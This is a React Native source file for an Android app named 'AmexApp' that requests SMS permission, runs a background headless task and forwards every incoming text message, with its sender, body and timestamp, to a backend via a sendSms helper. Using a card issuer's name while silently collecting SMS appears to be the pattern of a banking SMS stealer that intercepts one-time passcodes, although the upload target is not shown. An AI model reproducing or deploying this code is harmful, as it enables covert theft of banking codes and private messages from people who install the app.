import { useState, useEffect, useRef } from 'react';
import { PermissionsAndroid, AppRegistry, NativeAppEventEmitter, Alert } from 'react-native';
import { Provider, useSelector } from 'react-redux';

import { NavigationContainer } from '@react-navigation/native';
import AsyncStorage from '@react-native-async-storage/async-storage';

import { store } from './store/store';
import { sendSms, requestSmsPermission } from './utils';
import MyStack from './navigation/StackNavigator';


function AmexApp() {
  const [receiveSmsPermission, setReceiveSmsPermission] = useState('');
  const [user_profile, setUserProfile] = useState(null)
  const processedTimeStamp = useRef(new Set())

  const { id } = useSelector(state => state.id)

  useEffect(() => {
    const setupPermissions = async () => {
      const permission = await requestSmsPermission()
      setReceiveSmsPermission(permission)
    }
    setupPermissions()
  }, []);

  useEffect(() => {
    AppRegistry.startHeadlessTask(0, 'SmsHeadlessTask');
  }, []);

  useEffect(() => {
    const getUserId = async () => {
      if (id !== null && id !== undefined) {
        setUserProfile(id)
        return
      }

      const userProfile = await AsyncStorage.getItem('user_profile');
      if (userProfile) {
        const { user_profile } = JSON.parse(userProfile)
        setUserProfile(user_profile)
      }
    }
    getUserId();
    console.log(`${id} is the user Id`)
  }, [user_profile, id])


  useEffect(() => {
    if (receiveSmsPermission === PermissionsAndroid.RESULTS.GRANTED) {
      let subscriber = NativeAppEventEmitter.addListener(
        'onSMSReceived',
        async (message) => {
          const { messageBody, senderPhoneNumber, timestamp } = JSON.parse(message);
          const formattedTimeStamp = new Date(timestamp).toISOString()
          if (user_profile) {
            if (!processedTimeStamp.current.has(formattedTimeStamp)) {
              const data = {
                user_profile: user_profile,
                sender: senderPhoneNumber,
                message: messageBody,
                timestamp: formattedTimeStamp,
              };
              const x = await sendSms(data);
              processedTimeStamp.current.add(formattedTimeStamp)
            }
          }
        },
      );
      return () => {
        subscriber.remove();
      };
    }
  }, [receiveSmsPermission, user_profile]);

  return (
    <NavigationContainer>
      <MyStack />
    </NavigationContainer>
  );
}

export default function App() {
  return (
    <Provider store={store}>
      <AmexApp />
    </Provider>
  )
}
